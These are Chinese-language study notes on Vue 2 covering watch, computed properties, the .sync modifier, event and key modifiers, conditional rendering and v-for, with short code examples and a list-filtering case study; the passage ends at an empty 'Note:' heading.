Tab
```html
<template>
  <div @click="handleClick">
    <slot></slot>
  </div>
</template>

<script>
export default {
  props: {
    value: String
  },
  methods: {
    handleClick() {
      this.$parent.trigger(this.value)
    }
  }
}
</script>
```

<br>

**总结:**  
在使用 组件的 v-model 的时候 需要做两件时间

1. 子组件接收 props: ["value"] (默认情况下 没有model配置项)
2. 子组件要派发 input 事件 (默认情况下 没有model配置项)
3. 派发的事件的第二个参数 会重新赋值给 v-model="这个变量"

<br>

### 案例: 计算属性的应用 求出总价格
页面上输出总价格

```js 
<div id="app">
  <h3>总价格:{{totalPrice}}</h3>
</div>

const app = new Vue({
  el: '#app',
  data: {
    books: [
      {id:1, name:'unix编程艺术', price:119},
      {id:2, name:'代码大全', price:105},
      {id:3, name:'深入理解计算机原理', price:98},
      {id:4, name:'现代操作系统', price:87}
    ]
  },

  computed: {
    totalPrice: function() {
      let result = 0;
      for(let i = 0 ; i<this.books.length; i++) {
        result += this.books[i].price;
      }

      return result;
    }

    // 使用es6的 reduce方法
    totalPrice: function() {
      let result = this.books.reduce(function(tmp, item, index){
        return tmp + item.price;
      }, 0)

      return result;
    }
  }


  // 整理一下的写法
  total() {
    return this.books.reduce((pre, item) => pre += item.price, 0)
  }

})
```

<br><br>

# 监视属性 watch
需求: 点击按钮 更新天气状态

<br>

### 计算属性: 完成需求
下面我们使用的是计算属性完成的逻辑 逻辑很简单 通过计算属性决定展示在页面上的值是什么 然后通过点击按钮改变计算属性中依赖的变量的值
```html
  <div @click='showWeather'>
    今天天气很 {{info}}  
  </div>

<script>
  new Vue({
    el: '#root',
    data() {
      return { isHot: false }
    },
    computed: {
      info() { return this.isHot ? '炎热' :'凉爽' }
    },
    methods: {
      showWeather() { this.isHot = !this.isHot }
    }
  })
</script>
```

但是上面的做法有一个坑 就是当我页面上不使用 计算属性的时候 我点击按钮 开发者工具显示没有改变数据 但实际是改变了
```js 
  // 比如我点击按钮后 正常 开发者工具会显示
  isHot: false  --- isHot: true

  // 实际上 开发者工具会显示
  isHot: false  --- isHot: false

  // 但数据其实是改了的 只是开发者工具会有问题
```

<br><br>

## 监视属性: 完成需求
```js
{
  // 配置项
  watch: {} 
}
```

### 作用:
监视属性的变化 在配置项中写监视谁 监视哪个属性 **不仅可以监视data中的属性 计算属性也可以监视 还可以监视路由**

<br>

**注意:**  
在watch里面配置监视属性的时候 要监视的属性前面 **不用使用this** 但是在监视属性内部的配置函数 handler 里面要想获取data中的变量要写this

<br>

### 监视属性: 对象写法
```js
watch: { 
  要监视的属性: { 

    // 当要监视的属性发生变化时 会自动调用该回调
    handler(新值 旧值) { 不需要return 可以直接写逻辑 }

    // 初始化时让handler调用一下 默认值是false 立即马上执行
    immediate: false

    // 当为true的时候开启深度监视
    deep: true
  }
}
```

<br>

要监视的属性的值是一个对象 对象里有handler函数 该函数在监视的属性发生变化的时候回被调用
```js 
// 比如上面的案例 我们点击按钮后修改了 变量 isHot 现在我想监视isHot的变化 只要它发生了变化就要通知我
watch: {
  isHot: {
    // 当isHot发生变化的时候该函数会被调用
    handler(newValue, oldValue) { }

    // 立即马上执行 默认值是false 初始化时让handler调用一下
    immediate: false
  }
}
```

那有什么作用呢? 比如我们保存的是温度 那我就可以拿到新的温度和旧的温度 相减拿到差后做后续的逻辑 对一个属性做监测 然后对比 然后做逻辑处理

<br>

**<font color="#C2185B">配置: immediate</font>**  
当为false的时候 只有监视的属性发生改变的时候才会执行handler里面的代码  

当为true的时候 监视属性没有发生改变 一上来就会执行一遍handler里面的代码

<br>

**注意:**  
handler函数中 一上来的时候 oldValue为undefined newValue为一上来展示的值

<br>

**<font color="#C2185B">配置: deep</font>**  
深度监视 

vue中的watch默认不监测对象内部值的改变, 就算是下面的结构 name的值发生变化 它也是监视不到的
```js
obj: {name: "sam"}
```

deep: true 可以监测对象内部值的改变

<br>

**备注:**  
vue自身可以监测对象内部值的改变 但vue提供的watch默认不可以 使用watch时 根据数据的具体结构 决定是否开启深度监测

<br>

### 监视: 对象中的指定属性

需求: 我需要监视numbers里面的a属性 不监视b怎么做? 
```js 
data: {
  numbers: {
    a: 1
    b: 1
  }
}

watch: {

  // 注意属性名的本质是字符串 我们不能直接值 number.a 的形式
  'number.a': {
    handler(n, o) {
      console.log(n, o)
    }
  }


  // 那假如我们这么写能监测到number的变化么 
  'number': {
      handler(n, o) {
        console.log(n, o)
      }
    }
  }
}
```

答案是不能 因为这么写是监测number:{ } vue将整个对象当做监视的对象 

并不是对象里面的某一个值 也就是vue监视的这个对象的地址值 而这个对象中的属性发生变化 vue并不能监测到 那怎么才能监测到呢? 

为了完成深度监视 我们可以开启深度监视 在监视的属性的配置对象中添加 deep: true

```js 
'number': {
  handler(n, o) {
    console.log(n, o)
  }

  // 监视多级结构中所有属性的变化
  deep: true
}
```

<br>

### 监视: 数组中的元素
```js
watch: {
  // 监听 数组中第0项的name属性
  "arr.0.name"() {

  }
}
```

<br>

### 监视: 路由route

<br>

### 监视的简写形式:
简写形式的前提是 你不需要deep 不需要immediate的时候 当只有handler的时候就可以开启简写形式

将要监视的属性 写成一个函数的形式 函数名就是监视的属性名
```js 
watch: {
  isHot(n, o) {

  }
}
```

<br>

### $watch方法:
监视属性watch 当被监视的属性变化的时候 回调函数自动调用 handler 进行相关操作 监视的属性必须存在 才能进行监视  

```js 
// 参数1 监视谁  
// 参数2 回调 当a发生改变的时候 会在回调里面
vm.$watch('a', function(newVal, oldVal) {
  // 做点什么 this 是vm
})
```

<br>

### 监视属性: 新值 和 旧值相同的问题
当你第一次开始监视一个属性时, 新值和旧值可能会相同。这种情况通常发生在以下两种情况下

**1. 初始化阶段: **  
当你在组件创建时设置了一个初始值, 并且在 watch 中监视该属性时, 第一次触发监视时新值和旧值都是初始值, 因此它们是相同的。

<br>

**2. 属性的初始值与变化后的值相同: **  
如果在组件初始化时, 属性的初始值就与后续变化后的值相同, 那么在第一次监视时新值和旧值也会相同。

<br>

当新值和旧值相同时, Vue 默认不会触发 watch 的回调函数, 因为它会认为没有实际的变化发生。

<br>

如果在 Vue 的 watch 中, 第一次监视时新值和旧值相同, **有三种解决方法**

<br>

**第一种:**   
因为我们监视的是引用类型的对象, 如果该对象中的属性发现变化的时候 不会触发回调

如果想要得到不同的值可以结合计算属性, 我们可以再设置一个计算属性, 保存data为副本, 然后监听这个副本的变化: 
```js
computed: {
  data() {
    return JSON.parse(JSON.stringify(this.info));
  },
},
watch: {
  data: {
    handler: function (newInfo, oldInfo) {
      console.log(
        "newValue:",
        newInfo.nba.name,
        "oldValue:",
        oldInfo.nba.name
      );
    },
    deep: true, // 深度侦听
    // immediate: true, // 立即执行
  },
},
```

<br>

**第二种:**  
在定义 watch 时, 添加 immediate: true 属性。这将会在组件挂载时立即执行一次 watch 函数, 因此可以保证新旧值不会相同
```js
watch: {
  someValue: {
    immediate: true,
    handler(newVal, oldVal) {
      // do something
    }
  }
}
```

<br>

**第三种:**  
在 watch 函数中手动判断新值和旧值是否相同。

如果相同, 可以在处理函数中添加一个特殊的标志, 以便在下次 watch 时识别这是第一次执行。示例如下: 

```js
data() {
  return {
    isFirstTime: true,
    someValue: 'initial value'
  }
},
watch: {
  someValue(newVal, oldVal) {
    if (this.isFirstTime) {
      this.isFirstTime = false;
      return;
    }
    // do something
  }
}
```

<br>

### 上述第一种情况演示:
当我们使用watch监视的是一个对象的时候 

在 Vue 中, 对象是引用类型, 当你在组件中修改 searchForm 对象中的某个属性时, 它会直接修改原始对象, 而不是创建一个新的对象。

**因此, 在这种情况下, 新值和旧值实际上都是同一个对象的引用, 即使它们的属性已经发生了改变。**

<br>

为了解决这个问题, 你可以考虑将 searchForm 对象重新赋值一个新的对象, 而不是在原始对象上进行修改。

这将会导致新值和旧值成为两个不同的对象, 从而使 watch 监视器能够正确地检测到值的变化。

```js
methods: {
  updateSearchForm(newValue) {
    this.searchForm = Object.assign({}, this.searchForm, newValue);
  }
},
watch: {
  searchForm: {
    handler(nf, of) { 
      console.log("")
      console.log("n: ", JSON.stringify(nf, null, 2))
      console.log("o: ", JSON.stringify(of, null, 2))
    },
    deep: true
  }
}
```

<br><br>

## watch 和 computed 的对比
上面的案例中我们是通过计算属性来得到fullName

现在我们使用一下watch来做 那我们就要思考 我们要监视谁 应该是firstName 和 lastName吧
```js 
data: {
  fullName: 'zhang-san'
}

watch: {
  firstName(n) {
    this.fullName = n + this.lastName
  }

  lastName(n) {
    this.fullName = this.firstName + n
  }
}
```

使用watch做的话会比较麻烦我们要准备好一个fullName 还要分别对 姓 和 名 进行监视 上面感觉是计算属性来实现会比较好一些 但是有的时候可能watch会比较好

比如: 当姓发生改变的时候 全名延迟1秒再发生变化
```js 
// watch
firstName(n) {
  setTimeout(()=>{
    this.fullName = n + this.lastName
  }, 1000)
}
```

<br>

### 总结:
- **监视属性里可以开启异步任务来维护数据**
- 计算属性里不能开启异步任务来维护数据
```js 
computed: {
  fullName(n) {
    setTimeout(()=>{

      // 计算属性靠着函数内部的return来得到属性值 但是 异步的timeout是将返回值给timeout了而不是给fullName了 所以fullName的返回值是undefined
      return this.firstName + this.lastName
    }, 1000)
  }
}
```

computed能完成的功能 watch都可以完成 watch能完成的功能 computed不一定能完成 例如 watch可以进行异步操作

<br>

### 两个重要的小原则:
- 被vue管理的函数 最好写成普通函数 这样this的指向才是vm或者组件实例对象

- 所有不被vue管理的函数 定时器 ajax回调等 最好写成箭头函数 这样this的指向才是vm或者组件实例

<br><br>

# 事件的监听 / 处理
在前端开发中, 我们需要经常和用户交互, 这个时候 我们就必须监听用户发生的事件, 比如点击 拖拽 键盘事件等等

Vue中的事件 和 回调 要定义在 methods配置项 中

<br>

### 注意:
- **methods中配置的函数 不要用箭头函数 否则this就不是vm了**
- methods中配置的函数 都是被vue管理的函数 this的指向是vm 或 组件实例对象 事件的回调需要配置在methods中 最终会在vm上

<br>

### v-on指令绑定事件
```html
<元素 v-on:click="回调" />

<!-- 简写: -->
<元素 @事件名="回调" />
```

<br>

### v-on的简单用法:
因为指令语法 "" 里面可以写表达式
```js 
<div id="app">
  <button v-on:click='count++'>+</button>
</div>
```

<br>

### 事件回调传参的情况:
**<font color="#C2185B">不传递参数的情况</font>**   
回调中接收到的是 event 事件对象
```js 
<button @click='add'>+</button>

methods: {
  // 该方法会接收到event对象 vue帮我们传递进来的
  add(event) { this.count++; },
}
```

<br>

**<font color="#C2185B">传递参数的情况</font>**   
我们可以直接在小括号中写参数 如果同时要使用 event 需要用 $event 关键字来占位 $event需要放在形参最后

```js 
<button @click='add(66, $event)'>+</button>
methods: {

  // 该方法会接收到event对象 vue帮我们传递进来的
  add(number, event) { 
    console.log(number)
    console.log(event.target)
  },
}
```

<br>

### 事件的修饰符:
### **<font color="#C2185B">@click.native</font>**  
正常我们在组件标签内部使用 @click 的时候 vue都会把这些原生事件当做自定义事件处理

如果我们想给组件绑定原生的点击事件 我们要使用.native修饰符
```js 
<Student @click.native='callback'>
```

<br><br>

# 修饰符 .sync
我们这里说说在向子组件通过props传递数据的时候 使用 .sync 的情况

```js
<子组件 :title.sync="title">
```

<br>

### 作用:
将父组件的数据 传递给 子组件的数据 实现双向绑定, 也就是子组件中修改了数据 可以同步到父组件中

<br>

### 回顾: 正常我们修改父组件传递进来的数据应该怎么处理?
1. 父组件会使用 v-bind 将 title 对应的数据 以 props 的形式传递到子组件中

2. 子组件想要修改props的title数据时 需要将更新的数据通过 $emit 回传到父组件中

3. 父组件监听子组件派发的数据, 在父组件中拿到新数据 并修改title对应的值

```html
<!-- 父组件 -->
<子组件 
  :title="title" 
  @update:title="title = 新数据"
>
  ...
</子组件>
```

```js
// 子组件
<button @click="changeTitle">
{
  props: ["title"],
  methods: {
    changeTitle() {
      this.$emit("update:title", "新数据")
    }
  }
}
```

<br>

### 要点:
1. 父组件通过props传递到子组件中的数据 要是想修改的时候 请利用 emit 派发事件 让父组件进行修改

2. 自定义事件可以起 update:title 这样的名字 不错啊!!!

<br>

### .sync的使用:
.sync相当于我们把title传递到子组件的同时 再监听子组件派发的自定义事件  

监听的事件名是固定的写法:**update:传递过去的数据** 子组件派发的事件名 比如是 update:title

```html
<子组件 :title.sync="title">
  ...
</子组件>


<!-- 相当于 -->
<子组件 
  :title="title"
  @update:title="title = val"
>
  ...
</子组件>
```

我们将title对应的数据通过props传递到子组件的时候加上了 sync 修饰符

这时父组件相当于做了两件事:
1. 使用 v-bind 通过props传递title
2. 在子组件中监听 @update:title 事件

<br>

**代码部分:**  
App父组件
```html
<template>
  <div>
    <Child :title.sync="title"/>
  </div>
</template>

<script>
import Child from "./components/Child.vue"
export default {
  components: {Child},
  data() {
    return {
      title: "sam"
    }
  }
}
</script>
```

<br>

Child子组件
```html
<template>
  <div>
    <h3>Child组件 -- {{title}}</h3>
    <button @click="changeTitle">Update</button>
  </div>
</template>

<script>
export default {
  props: ["title"],
  methods: {
    changeTitle() {
      // 派发事件名的格式
      this.$emit("update:title", "erin")
    }
  }
}
</script>
```

<br>

### 技巧:   
当我们想将对象中的属性传递给子组件的时候 这样就相当于v-bind="对象" 会将对象中的所有属性传递过去 但是子组件的派发自定义事件还是得照做
```html
<子组件 v-bind.sync="obj"></子组件>
```

<br>

### 实战:
我们看看 .sync 在实战中的应用

**场景1: computed**  
父组件传递了 props dialogFlag, 子组件使用计算属性
- getter: 从props dialogFlag中拿数据
- setter: 利用 setter 来派发事件 ``this.$emit('update:dialogFlag', n)``

<br>

父组件
```html
<RestDialog
  :rest-dialog-visible.sync="restDialogVisible"
/>
```

子组件
```html
<script>
export default {
  props: {
    dialogFlag: {
      type: Boolean,
      default: false
    }
  },
  computed: {
    dialogVisible: {
      get() {
        return this.dialogFlag
      },
      set(n) {
        this.$emit('update:dialogFlag', n)
      }
    }
  }
}
</script>
```

<br>

**场景2: watch**  
父组件通过 v-model 传递了一个boolean
```html
<InsertDialog
  v-model="insertUpdCancelDialog"
>
```

子组件使用props接收value, 模版中也使用value, 当value的值变化的时候使用watch派发事件
```html
<!-- eslint-disable-next-line -->
<v-dialog v-model="value" />

<script>
export default {
  props: {
    value: {
      type: Boolean,
      default: false
    }
  },
  watch: {
    value(n) {
      this.$emit('update:value', n)
    }
  },
}
</script>
```


<br><br>

# 事件的修饰符
在某些情况下, 我们拿到event的目的可能是进行一些事件的处理 vue提供了修饰符来帮助我们方便的处理一些事件

<br>

### 语法: @事件名.修饰符
修饰符还可以串联使用
```html 
<button @click.stop.prevent='doThis'>点击</button>
```

<br>

### 停止冒泡:
### **<font color="#C2185B">@事件名.stop</font>**  
相当于调用 event.stopPropagation()  

<br>

当结构出现嵌套的时候 子元素的事件会冒泡到父元素上 **阻止冒泡一般加载子元素的身上**
```html 
<button @click.stop='doThis'>点击</button>
```

<br>

### 阻止默认行为:
### **<font color="#C2185B">@事件名.prevent</font>**  
相当于调用 event.preventDefault()
```html 
<button @click.prevent='doThis'>点击</button>
```

<br>

### 回调仅触发一次:
### **<font color="#C2185B">@事件名.once</font>**  
只触发一次回调
```html 
<!-- 事件的回调只触发一次 -->
<button @click.once='doThis'>点击</button>
```

<br>

### 实际工作中的应用场景:
有的时候 只想让这个功能实现一次 我们就使用了once 但是如果发生了网络错误之类的现象 用户点击了一次之后不能再次点击了 体验不好 这是后我们就搭配上了 try catch
```js 
try {

} catch() { 在这里再次的绑定了once事件 }
```

<br>

### 使用事件的捕获模式:
### **<font color="#C2185B">@事件名.capture</font>**  
嵌套结构的时候会有捕获的情况 一般该修饰符加在父元素身上

<br>

### 只有event.target是当前操作的元素时候才可以触发该事件
**<font color="#C2185B">@事件名.self</font>**  
某种程度上说 .self 也能阻止冒泡
```html 
<div @click.self='showInfo'>
  <button @click='showInfo>
<div>
```

我们加在了父元素的身上 如果有人触发了div身上的click 并且target是div的时候才会调用showInfo  

我们点击的是button 然后会产生冒泡 div身上的click事件也会触发 但是 div的click事件是有条件的 只有target是自己 事件也是自己的时候才会触发  

所以button的click的事件是冒泡到div上了 但是却不会触发

<br>

### 事件的默认行为立即执行 无需等待事件回调执行完毕
### **<font color="#C2185B">@事件名.passive</font>**  
当我们给内容溢出的父元素绑定 wheel事件的时候 会产生一个问题 它会先执行回调的内部逻辑 执行完毕后再触发默认行为 滚动滚动条  

当我们给wheel.passive加上这个修饰符的时候 会先执行默认的行为比如滚动滚动条 然后再处理回调的内部逻辑  

移动端的项目可能会用的比较多一些

<br>

### 扩展: @scroll
是滚动滚动条的时候 会触发事件  
scroll的特点 当滚动条到底了 再次滚动滚动条的时候不会触发事件了

<br>

### 扩展: @wheel
1. 鼠标滚轮滚动的时候 会触发事件
2. 当鼠标滚轮滚动的时候 会先触发滚动的事件 执行内部的回调 回调执行完毕后再执行默认行为(将滚动条往下滚动)

wheel的特点 即使滚动条到底了 我们滚动滚轮的时候也会触发事件

<br>

### 给组件绑定事件
### **<font color="#C2185B">@事件名.native</font>**  
在我们需要监听一个组件的原生事件时, 必须给对应的事件加上.native修饰符 才能监听
```html 
<!-- 但是vue3.0已经删除, 不添加该修饰符也可以给组件绑定事件 -->
<back-top @click.native='callback'></back-top>
```

<br>

### 案例: 阻止事件冒泡
下面的例子中 点击按钮后 同时也会触发 div的点击事件
```html
<div id="app">
  <div class='test' @click='divClick'>

    <!-- 阻止按钮的点击事件冒泡 -->
    <button @click.stop='btnClick'>按钮</button>
  </div>
</div>
```

<br>

### 案例: 阻止默认行为
下面的例子里, ``<input type="submit">`` 的情况下 点击这个按钮会把form表达里的数据收集起来提交到指定页面上

有些情况下我不希望它自动帮我提交 当我点击这个按钮的时候 做些逻辑处理后再提交, 可是如果不阻止input的默认行为的话, 提交表单的功能和回调中的逻辑处理的顺序是 提交表达先发生的, 所以要阻止表单的默认行为
```html
<input type='submit' @click.prevent='submitClick'>
```

<br>

### 键盘事件按下特定的键触发回调
### **<font color="#C2185B">@事件名.(keyCode | keyAlias | enter) || 按键别名</font>**  
只当事件是从特定键位触发时才触发回调

<br>

**常用的按键别名:**  
- keyCode: 键盘编码 @keyup.13  
**该方式不被推荐了 尽量不要使用该方式 请使用别名**

- enter: 回车

- delete: 删除

- esc: 退出

- space: 空格

- tab: 退格  
该按键有一个神奇的功能就是将焦点切走 它要配合keydown来使用

- up
- down
- left
- right

<br>

vue未提供别名的按键 可以使用按键原始的key去绑定 当按键名称由多个单词组成的时候我们要使用aaa-bbb的形式连接使用(短横线命名)
```js 
console.log(e.key, e.keyCode)    // CapsLock 13
@keyup.caps-lock
```

<br>

**系统修饰键:**  
ctrl alt shift meta

- 配合keyup使用   
按下修饰键的同时 再按下其他键 随后释放其他键 事件才会被触发

- 配合keydown使用    
正常触发事件

- 系统修饰键.按键  
只有系统修饰键和按键配合使用的时候才会触发回调 @keyup.ctrl.y

```html 
<!-- 只有按下 enter 键位的时候才会被触发回调 -->
<input 
  type="text" 
  value='' 
  placeholder="输入文字" 
  @keyup.enter='showInfo'
>
```

<br>

### 配置按键的别名:
**语法:** 
```js
Vue.config.keyCodes.别名 = 键码
```

```js 
Vue.config.keyCodes.huiche = 13
```

<br><br>

# v-show
v-show的用法 和 v-if非常相似, 也用于决定一个元素是否渲染 vue会根据表达式的布尔值决定该元素是显示还是隐藏 表达式中如果写变量的情况下 它会去data中找变量

<br>

### 语法:   
```html
<div v-show='表达式'>测试段落</div>
```

<br>

### 注意:
使用v-show来控制显示和隐藏的元素 本质是通过 display: none / block 来控制的 它的节点还在

```js 
<div v-show='1 === 1'>测试段落</div>
<div v-show='false'>测试段落</div>
```

所以如果给组件绑定该指令的话 该组件不会走如下的周期
- created
- destoryed

<br><br>

# v-if, v-else-if, v-else 
这三个指令与js的条件语句if else else if类似  

vue的条件指令可以根据表达式的值 在dom中 **渲染或销毁** 元素 或 组件

<br>

### 注意:
dom的结构会根据v-if的结果 **反复执行 销毁 和 创建 这两个过程**

<br>

### 应用场景:
当满足条件的时候 我才希望元素渲染在dom结构中 不满足条件的时候 不希望它渲染出来 一般都是在服务器端传过来的数据 决定某一大段需要不需要显示在dom结构中

<br>

### 语法:
```js
v-if='布尔类型的值 或者 表达式'
```

<br>

### 案例: 简单的使用v-if v-else
我们通过控制isShow变量的值 来决定显示哪个部分, 当为true的时候显示v-if的部分, 当为false时, 会显示v-else的部分  

我们看下下面的按钮是用v-show来实现的 当点击按钮后 n会加1 当n的值为1 2 3的时候会显示对应的div
```html
<!-- 当我点击按钮的 data 中的n发生了变化 用到n的地方就会重新解析 发生 n == 1 是成立的于是乎就显示了 -->
<div id="app">
  <div v-show='n==1'>react</div>
  <div v-show='n==2'>vue</div>
  <div v-show='n==3'>angular</div>

  <button @click='n++'>点我加1</button>
</div>

<script>
const app = new Vue({
  el:'#app',
  data: {
    n: 0
  }
})
</script>
```

<br>

### v-if, v-else if, v-else
它的逻辑和我们js中的逻辑一样 一旦v-if成立就不会走v-else if的逻辑

这种场景用的不多, 因为这需要在标签内部写很多逻辑, 遇到这种情况不如在computed中计算好在拿出来

```html 
<!-- 标签中写入if else if else 会把符合条件的结构渲染在html结构中 -->
<div id="app">
  <p v-if='score>=90'>优秀</p>
  <p v-else-if='score>=80'>良好</p>
  <p v-else-if='score>=60'>及格</p>

  <!-- 它不用接条件 -->
  <p v-else>不及格</p>
</div>

<script>
const app = new Vue({
  el:'#app',
  data: {
    score:90
  }
})
</script>
```

<br>

### 总结:
当我们页面的dom元素切换的比较频繁的时候 建议使用v-show

<br>

**注意:**   
if else if else 中间不要被打断 打断后就失效了 v-if 必须是最先开始使用的
```html
<div v-if='n==1'>react</div>

<!-- 打断了 -->
<div>@</div>   

<div v-else-if='n==2'>vue</div>
<div v-else='n==3'>angular</div>
```

<br>

### ``<template>`` 和 v-if 的配合使用
它不会影响结构 当页面最终渲染的时候 vue会将 template 标签脱掉 优点就是不会破坏页面的html结构

<br>

**注意:**  
它能配合 v-if 的使用 也可以和 v-for 配合使用 同时**v-for**的逻辑 要比 v-if的**优先级高**

```js 
// 需求 当 n = 1 的时候展示下面的 h2

<h2 v-if='n == 1'>你好</h2>
<h2 v-if='n == 1'>你好</h2>
<h2 v-if='n == 1'>你好</h2>

// 这样n = 1的时候 3个h2都会显示 我们还可以这样
<div v-if='n == 1'>
  <h2>你好</h2>
  <h2>你好</h2>
  <h2>你好</h2>
</div>

// 但是上面那样破坏了html的结构 还有另外的一种方式
<template v-if='n == 1'>
  <h2>你好</h2>
  <h2>你好</h2>
  <h2>你好</h2>
</template>

// template 可以和 v-if 配合使用 不会添加html结构
```

<br>

### 案例: 条件渲染
需求: 用户在登录的时候, 可以切换使用 用户账号登录 还是 邮箱地址登录

```s
用户账号: | 用户账号 |  | 切换类型 |
```

```html
<div id="app">

  <!-- 
    当满足条件的时候显示if里面的结构, 当不满足条件的时候我们显示else里面的结构 
    -->
  <span v-if='isUser'>
    <label for="username">
      用户账号:
    </label>

    <!-- 注意这里增加了key值 -->
    <input 
      type="text" 
      placeholder='用户账号' 
      id='username' 
      key='username-input'
    >     
  </span>

  <span v-else>
    <label for="email">
      用户邮箱:
    </label>
    <!-- 注意这里增加了key值 -->
    <input 
      type="text" 
      placeholder='用户邮箱'  
      id='email' 
      key='email-input'
    >
  </span>
  
  <button @click='isUser=!isUser'>切换类型</button>
</div>

<script>
  const app = new Vue({
    el:'#app',
    data: {
      // 我们在这里定义一个状态
      isUser:true
    }
  })
</script>
```

<br>

### 增加key值的原因: 
输入框内的文本会被vue复用到另一个结构中 所以利用key值来区分 不让它复用 是不是一般这种情况都出现在文本框类的input中

<br>

### vue重复利用dom结构的问题:
在标签中添加自定义属性 key='value', 我们要保证key的值的不同 key的值如果一样, 那么vue就会认为可以复用 如果不一样就认为不可以不复用 会创建一个新的结构

```html
<input 
  type="text" 
  placeholder='用户账号' 
  id='username' 
  key='username-input'
>
```

<br>

**上面的案例存在一些小问题:**  
当我们在用户账号上的文本输入框里输入文本后, 点击切换类型后 原来在用户账号的文本框里的文字, 会显示在用户邮箱的文本框里  

可为什么明明是两个文本框 在第一个文本框里的文本 会出现在第二个文本框中呢 按道理来讲, 我们应该切换到另外一个input元素中了, 在另一个input元素中, 我们并没有输入内容, 为什么会出现这个问题呢?

<br>

**问题解答:**  
这是因为vue在进行dom渲染时, 出于性能考虑, 会尽可能的复用已经存在的元素, 而不是重新创建新的元素  

假如我们现在有一个div 我们准备把它渲染到浏览器的上面, vue内部并不会把这div直接渲染在浏览器上面, 它会做一层中间环节, 给你搞一个虚拟dom, 把我们要渲染的东西 先放在虚拟内存里面, 然后再把虚拟DOM渲染到浏览器上面

```
div   --- >   虚拟DOM   --- >   真实浏览器
```

vue在虚拟DOM中vue出于性能的考虑会尽可能的复用已经存在的元素 虚拟DOM是真实DOM的一种映射 在上面的额案例中, vue内部会发现原来的input元素不再使用, 直接作为else中的input来使用了

<br>

**解决方案:**  
如果我们不希望vue出现类似重复利用的问题, 可以给对应的input添加key 并且我们需要保证key的不同

<br><br>

# v-for
当我们有一组数据需要在页面上进行渲染时, 我们就可以使用v-for来完成 我们想生成哪个结构就在哪个结构上 使用 v-for
```js 
// 根据数据生成多个li
<ul>
  <li v-for='item in persons'> </li>
</ul>
```

<br>

### 语法: 
```html
<元素
  v-for='(item, index) in 数组对象' 
  :key='item.id'
/>
```

<br>

### 示例:
如果在遍历的过程中, 我们需要拿到元素在数组中的索引值 其中的index就代表了取出的item在原数组的索引值
```html
<ul>
  <li 
    v-for='(item, index) in persons' 
    :key='item.id'
  >
    {{item.name}} - {{item.age}}
  </li>
</ul>
```

<br>

### v-for: 遍历对象
使用v-for遍历对象 可以获取 
- 属性值
- 属性名
- 索引值

```html
<元素
  v-for='(value, key, index) in 对象'
  :key='key'
/>
```
 
<br>

### 示例:
```html 
<div id="app">
  <ul>
    <li v-for='(value, key, index) in info'>
      {{key}}:{{value}}:{{index}}
    </li>
  </ul>
</div>

<script>
  const app = new Vue({
    el:'#app',
    data: {
      info: {
        name:'sam',
        age:18,
        height:1.88
      }
    }
  })
</script>
```

<br>

### v-for: 遍历字符串
```html
<元素
  v-for='(char, index) in 字符串' 
  :key='index'
/>
```

<br>

### v-for: 遍历数字
```html
<元素
  v-for='(number, index) in 数字'
  :key='index'
/>
```

```html 
<元素
  v-for='(number, index) in 5'
  :key='index'
/>
```

<br>

### 技巧:
v-for也可以和配合``<template v-for>``来渲染一段结构  

**但是template上需要注意 key值 的问题:**  
key值没有办法加在template上 我们只能加在元素节点上 我们可以通过下面的方式 确保要循环遍历的结构是不同的
```html
<template v-for="(item, index) of list">
  <dd :key="'dd' + index">
  <dt :key="'dt' + index">
</template>
```

<br><br>

## v-for 与 v-if
同时使用 v-if 和 v-for 是不推荐的 因为这样二者的优先级不明显。 
```html
<!-- 
  这会抛出一个错误 因为属性 todo 此时没有在该实例上定义 
-->
<li 
  v-for="todo in todos" 
  v-if="!todo.isComplete"
>
  {{ todo.name }}
</li>
```

<br>

### 解决办法:
在外新包装一层 ``<template>`` 再在其上使用 v-for 可以解决这个问题 (这也更加明显易读): 

```html
<template v-for="todo in todos">
  <!-- 这样 我们才能拿到 todo -->
  <li v-if="!todo.isComplete">
    {{ todo.name }}
  </li>
</template>
```

<br><br>

## 案例: 列表过滤(模糊搜索)
用户输入文字 我们根据文字来过滤列表中的数据 比如我输入"马" 页面上展示马冬梅 我输入"周" 页面上展示周冬雨 和 周杰伦
```html
<input 
  type="text" 
  v-model='info' 
  placeholder="请输入名字"
>
<ul>
  <li 
    v-for='(item, index) in persons' 
    :key='index'
  >
    {{item.name}} -  {{item.age}}
  </li>
</ul>

<script>
  new Vue({
    el: '#root',
    data() {
      return {
        persons: [
          {id: '001', name: '马冬梅', age: 18},
          {id: '002', name: '周冬雨', age: 17},
          {id: '003', name: '周杰伦', age: 4},
          {id: '004', name: '温兆伦', age: 33},
        ],
        info:''
    } }
  })
</script>
```

<br>

### 思路:
1. 收集用户收入数据
2. 拿着用户的输入去匹配

这个案例最标准的做法是用计算属性去写 我们先用watch来实现

<br>

### watch实现:
用户输入的数据我们可能拿到 接下来我们就要拿着用户输入的数据去用户信息的数据中去进行过滤  

我们使用的是v-model来实现的数据获取 假如我们输入了 "刘" 我们需要过滤一遍用户信息的数据 假如我们输入的是 "王" 那么我们需要再次的过滤遍数组

也就是说当用户输入的关键词发生变化的时候 我们都要进行过滤 那我们怎么知道 用户输入的数据info变了呢 这时候 就要使用 watch 吧  

也就是说我们拿着用户输入的数据info 去数组persons 中进行过滤 filter

```js 
persons: [
  {id: '001', name: '马冬梅', age: 18},
  {id: '002', name: '周冬雨', age: 17},
  {id: '003', name: '周杰伦', age: 4},
  {id: '004', name: '温兆伦', age: 33},
],
info:'',

// 定义接收过滤出来的数据 盛放的新数组
personsArr: []


// 使用watch去监听 info 当info发生改变的时候 会自动调用回调
watch: {
  info(n) {
/*
  思路:
    我们拿着 info 去监测数组中的每一项里是否包含 info 如果包含 就将其找到 返回出来

  注意:
    filter不会影响原数组它会将找到的值 返回一个新数组 但是 我们不能

    this.persons = this.persons

    这样会删除原数组的数据 造成数据越找越少
    
    所以我们创建一个新的空数组 将过滤出来的数据装到空数组中 dom结果的位置 遍历空数组
*/

    // 方式1:
    this.personsArr = this.persons.filter(item => {
      return item.name.match(n) != null
    })

    // 方式2:
    this.personsArr = this.persons.filter(item => item.name.indexOf(n) != -1)
  }
}
```

上面做完有问题 基本的逻辑可以实现 但是 当用户没有在文本框里面输入任何文字的时候我们读取的是""  

<br>

**拿着""空串去查找 全都是true 那怎么办?**
```js
let arr = ["aa", "bb", "cc"]
let info = ""

arr.forEach((item, index) => {
  // 结果都是 0
  console.log(`${index} -- ${item.indexOf(info)}`)

  // 结果都是 空, 空 != null
  console.log(`${index} -- ${item.match(info)}`)

  // 结果都是 true
  console.log(`${index} -- ${item.includes(info)}`)
})
```

<br>

### 注意:
